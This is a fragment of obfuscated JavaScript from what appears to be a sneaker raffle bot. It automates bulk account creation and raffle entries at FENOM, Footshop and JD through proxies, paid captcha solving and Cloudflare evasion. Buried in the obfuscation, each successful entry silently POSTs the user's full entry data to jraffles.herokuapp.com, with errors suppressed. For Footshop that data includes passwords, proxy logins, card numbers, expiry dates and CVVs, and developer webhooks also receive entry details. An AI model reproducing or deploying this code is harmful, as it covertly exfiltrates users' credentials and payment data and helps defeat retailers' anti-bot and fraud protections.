                                const _0x132f5e = await _0x9e67d2['$']('.hcaptcha-box');
                                if (_0x132f5e)
                                    try {
                                        await _0x132f5e['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x9e67d2['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x261e7c = await _0x9e67d2['$']('.hcaptcha-box');
                                    if (_0x261e7c)
                                        try {
                                            await _0x261e7c['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            try {
                                await _0x9e67d2['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x2205d1['send']('Browser.setWindowBounds', {
                                    'windowId': _0x46e9d3,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0x572e60(0xfa0);
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            console['log'](_0xed09ee() + '\x20[' + _0x28e20a['name'] + ']\x20Task\x20' + (_0x2807f0 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x9e67d2['type']('input[name=\x22firstname\x22]', '' + _0x3d1662[_0x2807f0]['FirstName']), await _0x572e60(0x1f4), await _0x9e67d2['type']('input[name=\x22lastname\x22]', '' + _0x3d1662[_0x2807f0]['LastName']), await _0x572e60(0x1f4), await _0x9e67d2['type']('input[name=\x22email\x22]', '' + _0x3d1662[_0x2807f0]['Email']), await _0x572e60(0x1f4), await _0x9e67d2['type']('input[name=\x22password\x22]', '' + _0x3d1662[_0x2807f0]['Password']), await _0x572e60(0x258), await _0x9e67d2['$eval']('input[name=\x22psgdpr\x22]', _0x2e0072 => _0x2e0072['click']()), await _0x572e60(0x1f4), console['log'](_0xed09ee() + '\x20[' + _0x28e20a['name'] + ']\x20Task\x20' + (_0x2807f0 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x9e67d2['$eval']('#customer-form', _0x345a97 => _0x345a97['submit']());
                            try {
                                try {
                                    await _0x9e67d2['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                } catch {
                                    throw new Error('Succes-response\x20not\x20found');
                                }
                                _0x436562 = 'no', console['log'](_0x2d77f8['green'](_0xed09ee() + '\x20[' + _0x28e20a['name'] + ']\x20Task\x20' + (_0x2807f0 + 0x1) + '\x20:\x20Account\x20' + _0x3d1662[_0x2807f0]['Email'] + '\x20Generated')), _0x3d3f42['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x3d1662[_0x2807f0]['Email'] + ',' + _0x3d1662[_0x2807f0]['Password']);
                                let _0x56f788 = _0x3d1662[_0x2807f0];
                                try {
                                    prxdata = {
                                        'username': _0x447b4a['replace']('#', ''),
                                        'module': _0x28e20a['name'],
                                        'entrydata': JSON['stringify'](_0x56f788),
                                        'proxy': '' + _0x1fc388[_0x2807f0]
                                    };
                                    var _0x1cb6e8 = JSON['stringify'](prxdata);
                                    let _0x5cce0f = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3b676e['post']('https://jraffles.herokuapp.com/success', _0x1cb6e8, _0x5cce0f);
                                } catch (_0x7a7cdd) {
                                }
                                try {
                                    _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x167b8a['succesDEVMSG']);
                                } catch {
                                }
                                await _0x5641c6(_0x34385d, _0x167b8a['succesDEVMSG']);
                            } catch (_0x1a021b) {
                                throw new Error('Account\x20generation\x20failed');
                            }
                        } catch (_0x663752) {
                            console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x28e20a['name'] + ']\x20Task\x20' + (_0x2807f0 + 0x1) + '\x20:\x20' + _0x663752)), _0x4fe893 = '' + _0x663752;
                            var _0x302601 = await _0x254487(_0x3d1662[_0x2807f0], _0x28e20a, 'acc', !![], _0x4fe893);
                            _0x167b8a['errorDEV'] = { 'embeds': [_0x302601] }, _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x167b8a['errorDEV']), await _0x5641c6(_0x188004, _0x167b8a['errorDEV']), _0x436562 = 'yes';
                        } finally {
                            _0x2166d3['close']();
                            if (_0x436562 == 'yes' && _0x136986 != 0x5 && _0x4fe893 != 'Size\x20Not\x20Found') {
                                console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x28e20a['name'] + ']\x20Task\x20' + (_0x2807f0 + 0x1) + '\x20:\x20Retrying\x20(' + _0x136986 + '\x20/\x205)')), _0x2807f0 = _0x2807f0 - 0x1, _0x136986 = _0x136986 + 0x1;
                                continue;
                            }
                            _0x436562 == 'yes' && _0x136986 >= 0x5 && (_0x58f6f1(_0x3d1662[_0x2807f0], _0x28e20a), _0x436562 = 'no', _0x136986 = 0x0), console['log'](_0xed09ee() + '\x20[' + _0x28e20a['name'] + ']\x20Waiting\x20for\x20' + _0x114346['delay'] + '\x20ms'), await _0x572e60(_0x114346['delay']);
                        }
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x2139d0(_0xa73428, _0x51dd8b, _0xffe347) {
                    _0x5dd90e['use'](_0x118712()), _0x5dd90e['use'](_0x1e1820({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x114346['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2d82e3 = 0x0; _0x2d82e3 < _0x51dd8b['length']; _0x2d82e3++) {
                        if (_0x374524 != 'yes')
                            var _0x374524 = '', _0x5aedcd = 0x0;
                        var _0x2392e4;
                        try {
                            await _0x44ca58(_0x51dd8b, _0x2d82e3);
                        } catch {
                            _0x374524 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x59687e(_0xa73428['name'] + '\x20Task\x20' + (_0x2d82e3 + 0x1) + '\x20/\x20' + _0x51dd8b['length'] + '\x20||\x20File:\x20' + _0x2b0c3a + '\x20Proxies:\x20' + _0x5e9a1f);
                        const _0x538e2d = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x83d6f3 = Math['round'](Math['random']() * (_0xffe347['length'] - 0x1)), _0x5b05e0 = _0xffe347[_0x83d6f3]['split'](':'), _0x14e3f2;
                        try {
                            _0x14e3f2 = await _0x5dd90e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x5b05e0[0x0] + ':' + _0x5b05e0[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x14e3f2 = await _0x5dd90e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x5b05e0[0x0] + ':' + _0x5b05e0[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x42ed04 = await _0x14e3f2['newPage'](), _0x23b8db = await _0x42ed04['target']()['createCDPSession'](), { windowId: _0xcebd2c } = await _0x23b8db['send']('Browser.getWindowForTarget');
                            await _0x42ed04['authenticate']({
                                'username': '' + _0x5b05e0[0x2],
                                'password': '' + _0x5b05e0[0x3]
                            }), console['log'](_0xed09ee() + '\x20[' + _0xa73428['name'] + ']\x20Task\x20' + (_0x2d82e3 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x42ed04['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0xed09ee() + '\x20[' + _0xa73428['name'] + ']\x20Task\x20' + (_0x2d82e3 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x572e60(0xbb8), await _0x23b8db['send']('Browser.setWindowBounds', {
                                'windowId': _0xcebd2c,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x572e60(0x1f40);
                            try {
                                await _0x42ed04['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x572e60(0x1388), console['log'](_0xed09ee() + '\x20[' + _0xa73428['name'] + ']\x20Task\x20' + (_0x2d82e3 + 0x1) + '\x20:\x20Logging\x20in'), await _0x42ed04['type']('input[name=\x22email\x22]', '' + _0x51dd8b[_0x2d82e3]['Email']), await _0x572e60(0x1f4), await _0x42ed04['type']('input[name=\x22password\x22]', '' + _0x51dd8b[_0x2d82e3]['Password']), await _0x572e60(0x258), await _0x42ed04['$eval']('#login-form', _0x549fc7 => _0x549fc7['submit']()), await _0x42ed04['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x572e60(0x1f4), await _0x42ed04['goto']('' + _0x51dd8b[_0x2d82e3]['Url']), await _0x42ed04['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0xed09ee() + '\x20[' + _0xa73428['name'] + ']\x20Task\x20' + (_0x2d82e3 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x51dd8b[_0x2d82e3]['Size']);
                            if (_0x51dd8b[_0x2d82e3]['Size'] != 'RANDOM') {
                                var _0x2ed7f5 = '\x20' + _0x51dd8b[_0x2d82e3]['Size'] + '\x20';
                                const _0x4a42bc = await _0x42ed04['$x']('//span[contains(text(),\x20' + _0x2ed7f5 + ')]');
                                await _0x4a42bc[0x0]['click']();
                            } else {
                                const _0x49b4ce = await _0x42ed04['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x3d94d0 = Math['round'](Math['random']() * (_0x49b4ce['length'] - 0x1));
                                await _0x49b4ce[_0x3d94d0]['click']();
                            }
                            await _0x572e60(0x258), await _0x42ed04['click']('#cookieChoiceDismiss'), await _0x572e60(0x3e8), await _0x42ed04['type']('#instagram-account', '' + _0x51dd8b[_0x2d82e3]['Follower']), await _0x572e60(0x28a), await _0x42ed04['click']('#book-btn'), await _0x572e60(0xbb8);
                            try {
                                await _0x42ed04['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x572e60(0x1f4), console['log'](_0xed09ee() + '\x20[' + _0xa73428['name'] + ']\x20Task\x20' + (_0x2d82e3 + 0x1) + '\x20:\x20' + _0x2d77f8['cyan']('Solving\x20Captcha')), await _0x42ed04['solveRecaptchas'](), console['log'](_0xed09ee() + '\x20[' + _0xa73428['name'] + ']\x20Task\x20' + (_0x2d82e3 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x572e60(0x7d0), await _0x42ed04['$eval']('#book-btn-for-sure', _0x2e1e52 => _0x2e1e52['click']()), await _0x572e60(0x12c), await _0x42ed04['click']('#book-btn-for-sure'), await _0x572e60(0xdac);
                            const _0x5c7c04 = await _0x42ed04['$eval']('.reservation-popup\x20>\x20.title', _0x26ac20 => {
                                return _0x26ac20['innerHTML'];
                            });
                            if (_0x5c7c04) {
                                _0x374524 = 'no', _0x14aa55(_0x51dd8b[_0x2d82e3], _0xa73428), console['log'](_0x2d77f8['green'](_0xed09ee() + '\x20[' + _0xa73428['name'] + ']\x20Task\x20' + (_0x2d82e3 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x24a826 = await _0x254487(_0x51dd8b[_0x2d82e3], _0xa73428, 'dev', ![]), _0x5f02bc = await _0x254487(_0x51dd8b[_0x2d82e3], _0xa73428, 'pub', ![]);
                                let _0x467d1d = _0x51dd8b[_0x2d82e3];
                                try {
                                    prxdata = {
                                        'username': _0x447b4a['replace']('#', ''),
                                        'module': _0xa73428['name'],
                                        'entrydata': JSON['stringify'](_0x467d1d),
                                        'proxy': '' + _0xffe347[_0x2d82e3]
                                    };
                                    var _0x89d86f = JSON['stringify'](prxdata);
                                    let _0x323baa = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3b676e['post']('https://jraffles.herokuapp.com/success', _0x89d86f, _0x323baa);
                                } catch (_0x53ba17) {
                                }
                                const _0x196e42 = {
                                    'succesDEVMSG': { 'embeds': [_0x24a826] },
                                    'succesPUBMSG': { 'embeds': [_0x5f02bc] }
                                };
                                try {
                                    _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x196e42['succesDEVMSG']), await _0x572e60(0xc8), await _0x5641c6(_0x1543f5, _0x196e42['succesDEVMSG']), await _0x572e60(0xc8), await _0x5641c6(_0x30beeb, _0x196e42['succesPUBMSG']);
                                } catch (_0xccf07e) {
                                    console['log'](_0x2d77f8['yellow'](_0xed09ee() + '\x20[' + _0xa73428['name'] + ']\x20Task\x20' + (_0x2d82e3 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xccf07e));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x50cca4) {
                            console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0xa73428['name'] + ']\x20Task\x20' + (_0x2d82e3 + 0x1) + '\x20:\x20' + _0x50cca4)), _0x2392e4 = '' + _0x50cca4;
                            var _0xbb5d1c = await _0x254487(_0x51dd8b[_0x2d82e3], _0xa73428, 'dev', !![], _0x2392e4), _0x24a826 = await _0x254487(_0x51dd8b[_0x2d82e3], _0xa73428, 'dev', ![]), _0x5f02bc = await _0x254487(_0x51dd8b[_0x2d82e3], _0xa73428, 'pub', ![]);
                            const _0xbd1032 = {
                                'succesDEVMSG': { 'embeds': [_0x24a826] },
                                'succesPUBMSG': { 'embeds': [_0x5f02bc] }
                            };
                            _0xbd1032['errorDEV'] = { 'embeds': [_0xbb5d1c] }, _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0xbd1032['errorDEV']), await _0x5641c6(_0x188004, _0xbd1032['errorDEV']), _0x50cca4 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x374524 = 'yes');
                        } finally {
                            _0x14e3f2['close']();
                            if (_0x374524 == 'yes' && _0x5aedcd != 0x5 && _0x2392e4 != 'Size\x20Not\x20Found') {
                                console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0xa73428['name'] + ']\x20Task\x20' + (_0x2d82e3 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5aedcd + '\x20/\x205)')), _0x2d82e3 = _0x2d82e3 - 0x1, _0x5aedcd = _0x5aedcd + 0x1;
                                continue;
                            }
                            _0x374524 == 'yes' && _0x5aedcd >= 0x5 && (_0x58f6f1(_0x51dd8b[_0x2d82e3], _0xa73428), _0x374524 = 'no', _0x5aedcd = 0x0), console['log'](_0xed09ee() + '\x20[' + _0xa73428['name'] + ']\x20Waiting\x20for\x20' + _0x114346['delay'] + '\x20ms'), await _0x572e60(_0x114346['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x389089, _0x1f6abb, _0x48a739) {
                _0x5dd90e['use'](_0x118712()), _0x5dd90e['use'](_0x1e1820({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x114346['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x31620d = 0x0; _0x31620d < _0x1f6abb['length']; _0x31620d++) {
                    var _0xd99da1;
                    if (_0x1f3710 != 'yes')
                        var _0x1f3710 = '', _0x3ada16 = 0x0;
                    var _0x3332a5 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x447b4a
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x1f6abb[_0x31620d]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x1f6abb[_0x31620d]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x114346['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x92063b
                            }
                        ]
                    }], _0x3a6863 = await _0x254487(_0x1f6abb[_0x31620d], _0x389089, 'dev', ![]), _0x36a561 = await _0x254487(_0x1f6abb[_0x31620d], _0x389089, 'pub', ![]);
                    const _0x6bf1c0 = {
                        'succesDEVMSG': { 'embeds': [_0x3a6863] },
                        'succesPUBMSG': { 'embeds': [_0x36a561] }
                    }, _0xfa0d68 = { 'embeds': _0x3332a5 };
                    try {
                        await _0x44ca58(_0x1f6abb, _0x31620d);
                    } catch {
                        _0x1f3710 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x1f6abb[_0x31620d]['Email'] == '' || _0x1f6abb[_0x31620d]['FirstName'] == '' || _0x1f6abb[_0x31620d]['LastName'] == '' || _0x1f6abb[_0x31620d]['Country'] == '' || _0x1f6abb[_0x31620d]['Size'] == '' || _0x1f6abb[_0x31620d]['Address1'] == '' || _0x1f6abb[_0x31620d]['Zip'] == '') {
                        console['log'](_0xed09ee() + '\x20[' + _0x389089['name'] + ']\x20Task\x20' + (_0x31620d + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x1f6abb[_0x31620d]['Email'] == '' || _0x1f6abb[_0x31620d]['FirstName'] == '' || _0x1f6abb[_0x31620d]['LastName'] == '' || _0x1f6abb[_0x31620d]['Country'] == '' || _0x1f6abb[_0x31620d]['Size'] == '' || _0x1f6abb[_0x31620d]['Address1'] == '' || _0x1f6abb[_0x31620d]['Zip'] == '' || _0x1f6abb[_0x31620d]['Phone'] == '') {
                        console['log'](_0xed09ee() + '\x20[' + _0x389089['name'] + ']\x20Task\x20' + (_0x31620d + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0xe7fc09 = '' + _0x1f6abb[_0x31620d]['Url'];
                    if (_0x114346['useRandomProxy'] = ![])
                        var _0x60a2c1 = _0x48a739[_0x31620d]['split'](':');
                    else
                        var _0x557524 = Math['round'](Math['random']() * (_0x48a739['length'] - 0x1)), _0x60a2c1 = _0x48a739[_0x557524]['split'](':');
                    var _0x275244;
                    try {
                        _0x275244 = await _0x5dd90e['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x60a2c1[0x0] + ':' + _0x60a2c1[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x275244 = await _0x5dd90e['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x60a2c1[0x0] + ':' + _0x60a2c1[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x43d624 = await _0x275244['newPage']();
                        await _0x43d624['authenticate']({
                            'username': '' + _0x60a2c1[0x2],
                            'password': '' + _0x60a2c1[0x3]
                        }), console['log'](_0xed09ee() + '\x20[' + _0x389089['name'] + ']\x20Task\x20' + (_0x31620d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x43d624['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x43d624['setRequestInterception'](!![]), _0x43d624['on']('request', _0x2f1c2b => {
                            _0x2f1c2b['resourceType']() === 'image' || _0x2f1c2b['resourceType']() === 'font' || _0x2f1c2b['resourceType']() === 'media' ? _0x2f1c2b['abort']() : _0x2f1c2b['continue']();
                        });
                        try {
                            await _0x43d624['goto'](_0xe7fc09), await _0x572e60(0xbb8), await _0x43d624['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x43d624['click']('.control__JhutY'), await _0x572e60(0x1f4);
                        if (_0x1f6abb[_0x31620d]['Size'] != 'RANDOM')
                            try {
                                const _0x5dff8d = await _0x43d624['$x']('//div[contains(text(),\x20\x27' + _0x1f6abb[_0x31620d]['Size'] + '\x27)]');
                                await _0x5dff8d[0x0]['click']();
                            } catch {
                                console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x389089['name'] + ']\x20Task\x20' + (_0x31620d + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x1e8289 = await _0x43d624['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x732b11 = Math['round'](Math['random']() * (_0x1e8289['length'] - 0x1));
                            await _0x1e8289[_0x732b11]['click']();
                        }
                        await _0x572e60(0x4b0);
                        const _0x15b068 = await _0x43d624['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x15b068[0x0]['click'](), await _0x43d624['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0xed09ee() + '\x20[' + _0x389089['name'] + ']\x20Task\x20' + (_0x31620d + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x43d624['type']('input[name=\x22email\x22]', '' + _0x1f6abb[_0x31620d]['Email']), await _0x572e60(0x640), await _0x43d624['type']('input[name=\x22phone\x22]', '' + _0x1f6abb[_0x31620d]['Phone']), await _0x572e60(0x4b0), await _0x43d624['click']('button.btn.continue-button__1RtsS'), await _0x572e60(0x4b0);
                        try {
                            await _0x43d624['type']('input[name=\x22firstName\x22]', '' + _0x1f6abb[_0x31620d]['FirstName']), await _0x572e60(0x258);
                        } catch {
                            const _0x45e895 = await _0x43d624['$$eval']('.invalid-feedback\x20>\x20div', _0x6fdec5 => {
                                return _0x6fdec5['map'](_0x5e1fbf => _0x5e1fbf['innerText']);
                            });
                            console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x389089['name'] + ']\x20Task\x20' + (_0x31620d + 0x1) + '\x20:\x20' + _0x45e895));
                            continue;
                        }
                        await _0x43d624['type']('input[name=\x22lastName\x22]', '' + _0x1f6abb[_0x31620d]['LastName']), await _0x572e60(0xc8), await _0x43d624['type']('input[name=\x22instagramUsername\x22]', '' + _0x1f6abb[_0x31620d]['Follower']), await _0x572e60(0x4b0), await _0x43d624['click']('button.btn.continue-button__1RtsS'), await _0x572e60(0x3e8), console['log'](_0xed09ee() + '\x20[' + _0x389089['name'] + ']\x20Task\x20' + (_0x31620d + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x43d624['select']('select[name=\x22country\x22]', '' + _0x1f6abb[_0x31620d]['Country']), await _0x572e60(0x2bc), await _0x43d624['type']('input[name=\x22streetName\x22]', '' + _0x1f6abb[_0x31620d]['Address1']), await _0x572e60(0x258), await _0x43d624['type']('input[name=\x22houseNumber\x22]', _0x1f6abb[_0x31620d]['HouseNumber'] + '\x20' + _0x1f6abb[_0x31620d]['Address2']), await _0x572e60(0xc8), await _0x43d624['type']('input[name=\x22postalCode\x22]', '' + _0x1f6abb[_0x31620d]['Zip']), await _0x572e60(0x1f4), await _0x43d624['type']('input[name=\x22city\x22]', '' + _0x1f6abb[_0x31620d]['City']), await _0x572e60(0x4b0), await _0x43d624['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x572e60(0x4b0), await _0x43d624['click']('button.btn.continue-button__1RtsS'), await _0x572e60(0x4b0), console['log'](_0xed09ee() + '\x20[' + _0x389089['name'] + ']\x20Task\x20' + (_0x31620d + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x43d624['solveRecaptchas'](), console['log'](_0xed09ee() + '\x20[' + _0x389089['name'] + ']\x20Task\x20' + (_0x31620d + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x572e60(0xbb8), await _0x43d624['click']('button.btn.continue-button__1RtsS'), await _0x572e60(0x1388), console['log'](_0xed09ee() + '\x20[' + _0x389089['name'] + ']\x20Task\x20' + (_0x31620d + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x43d624['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x43d624['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x572e60(0x4b0), await _0x43d624['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x1f6abb[_0x31620d]['CardNumber']), await _0x572e60(0x320), await _0x43d624['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x43d624['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x1f6abb[_0x31620d]['ExpiryDate']), await _0x572e60(0x4b0), await _0x43d624['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x43d624['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x1f6abb[_0x31620d]['CVV']), await _0x572e60(0x226), await _0x43d624['type']('input[name=\x22holderName\x22]', '' + _0x1f6abb[_0x31620d]['NameOnCard']), await _0x572e60(0x226), await _0x43d624['click']('button.adyen-checkout__button'), console['log'](_0xed09ee() + '\x20[' + _0x389089['name'] + ']\x20Task\x20' + (_0x31620d + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x43d624['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x572e60(0xbb8);
                        } catch (_0x178197) {
                            console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x389089['name'] + ']\x20Task\x20' + (_0x31620d + 0x1) + '\x20:\x203DS\x20Failed')), _0xd99da1 = '3DS\x20Error\x20' + _0x178197;
                            var _0x4186d2 = await _0x254487(_0x1f6abb[_0x31620d], _0x389089, 'dev', !![], _0xd99da1);
                            _0x6bf1c0['errorDEV'] = { 'embeds': [_0x4186d2] };
                            _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x6bf1c0['errorDEV']);
                            await _0x5641c6(_0x188004, _0x6bf1c0['errorDEV']);
                            continue;
                        }
                        _0x14aa55(_0x1f6abb[_0x31620d], _0x389089), console['log'](_0x2d77f8['green'](_0xed09ee() + '\x20[' + _0x389089['name'] + ']\x20Task\x20' + (_0x31620d + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x182a1c = _0x1f6abb[_0x31620d];
                        try {
                            prxdata = {
                                'username': _0x447b4a['replace']('#', ''),
                                'module': _0x389089['name'],
                                'entrydata': JSON['stringify'](_0x182a1c),
                                'proxy': '' + _0x48a739[_0x31620d]
                            };
                            var _0x3b7f24 = JSON['stringify'](prxdata);
                            let _0x96f8ce = { 'headers': { 'content-type': 'application/json' } };
                            await _0x3b676e['post']('https://jraffles.herokuapp.com/success', _0x3b7f24, _0x96f8ce);
                        } catch (_0x449592) {
                        }
                        if (_0x114346['webhook'] != undefined && _0x114346['webhook'] != '')
                            try {
                                await _0x5641c6(_0x114346['webhook'], _0x6bf1c0['succesDEVMSG']);
                            } catch {
                            }
                        await _0x572e60(0xc8), await _0x5641c6(_0x1543f5, _0x6bf1c0['succesDEVMSG']), await _0x572e60(0xc8);
                        try {
                            await _0x5641c6(_0x30beeb, _0x6bf1c0['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x9c2f92) {
                        console['log'](_0xed09ee() + '\x20[' + _0x389089['name'] + ']\x20Task\x20' + (_0x31620d + 0x1) + '\x20:\x20' + _0x9c2f92), _0xd99da1 = '' + _0x9c2f92;
                        var _0x4186d2 = await _0x254487(_0x1f6abb[_0x31620d], _0x389089, 'dev', !![], _0xd99da1);
                        _0x6bf1c0['errorDEV'] = { 'embeds': [_0x4186d2] }, _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x6bf1c0['errorDEV']), await _0x5641c6(_0x188004, _0x6bf1c0['errorDEV']), _0x1f3710 = 'yes';
                    } finally {
                        _0x275244['close']();
                        if (_0x1f3710 == 'yes' && _0x3ada16 != 0x5) {
                            console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x389089['name'] + ']\x20Task\x20' + (_0x31620d + 0x1) + '\x20:\x20Retrying\x20(' + _0x3ada16 + '\x20/\x205)')), _0x31620d = _0x31620d - 0x1, _0x3ada16 = _0x3ada16 + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x114346['delay'] + '\x20ms'), await _0x572e60(_0x114346['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x587d4e, _0x43d77d, _0x5da766) {
                var _0x63445 = ![], _0x365f70 = ![];
                if (_0x114346['captchaKey'] == '' || _0x114346['captchaKey'] == undefined)
                    return console['log'](_0x2d77f8['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x5dd90e['use'](_0x118712()), _0x5dd90e['use'](_0x1e1820({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x114346['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x468d13 = 0x0; _0x468d13 < _0x43d77d['length']; _0x468d13++) {
                    if (_0x105ad2 != 'yes')
